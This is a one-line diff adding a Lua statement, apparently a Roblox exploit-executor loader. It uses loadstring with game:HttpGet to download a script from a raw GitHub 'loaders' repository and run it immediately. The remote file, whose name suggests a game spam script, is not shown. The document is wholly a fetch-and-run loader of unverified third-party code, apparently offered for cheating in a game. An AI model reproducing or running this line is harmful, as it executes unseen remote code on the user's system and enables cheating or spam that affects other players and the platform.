@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/7-days-cat-sitting-spam2-kmahe3tmm8xe2k.lua"))()
